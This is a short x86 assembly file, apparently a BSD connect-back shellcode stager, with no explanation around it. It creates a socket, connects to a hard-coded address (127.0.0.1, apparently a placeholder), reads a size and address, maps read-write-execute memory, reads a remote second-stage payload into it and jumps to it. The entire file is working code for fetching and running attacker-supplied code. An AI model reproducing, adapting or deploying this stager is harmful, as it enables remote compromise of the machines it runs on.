BITS 32

section .text
global main

main:
	push	byte 0x61
	pop	eax
	cdq
	push	edx
	inc	edx
	push	edx
	inc	edx
	push	edx
	push	dword 0x0100007f
	int	0x80

	xchg	eax, ebp

	push	word 0xffff
	push	dx
	mov	esi, esp
	push	byte 0x10
	push	esi
	push	ebp
	push	byte 0x62
	pop	eax
	cdq
	push	edx
	int	0x80

	mov	[esi - 4], byte 0x0c
	push	byte 0x03
	pop	eax
	int	0x80

	push	byte 0xff
	mov	dh, 0x10
	mov	dl, 0x12			; 0x1012 (ANON | FIXED | PRIVATE)
	push	edx
	push	byte 0x07			; READ | WRITE | EXEC
	push	dword [esi]			; size
	push	dword [esi + 4]			; addr
	mov	al, 71				; old_mmap() (portable?!)
	push	ebp
	int	0x80

	push	byte 0x03
	pop	eax
	push	dword [esi + 8]
	int	0x80

	ret
